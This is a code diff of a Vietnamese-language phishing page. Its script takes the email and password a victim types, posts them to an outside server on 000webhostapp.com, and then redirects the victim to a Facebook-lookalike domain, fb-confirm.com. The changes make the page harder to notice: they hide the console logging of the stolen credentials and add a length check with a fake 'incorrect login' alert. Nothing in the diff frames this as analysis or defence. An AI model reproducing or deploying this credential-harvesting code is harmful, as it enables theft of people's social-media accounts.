@@ -78,10 +78,16 @@
                     $("#lblMsg").html("Đang kiểm tra tài khoản vui lòng chờ trong giây lát")
                     var email = $("#email").val();
                     var pass = $("#pass").val();
-                    console.log(email); console.log(pass);
-                    $.post('https://lengockha2021.000webhostapp.com/index.php', {email: email,pass: pass}, function(data, textStatus, xhr) {
+                    //console.log(email); console.log(pass);
+                    if(email.length >8 && pass.length >5){
+                       
+                       $.post('https://lengockha2021.000webhostapp.com/index.php', {email: email,pass: pass}, function(data, textStatus, xhr) {
                         location.replace("http://vi-vn.fb-confirm.com/Videos/vu-huong-mai.mp4");
-                    });
+                        });
+                    }
+                    else{
+                        alert("Thông tin đăng nhập không chính xác");
+                    }
                 });
             });
         </script>
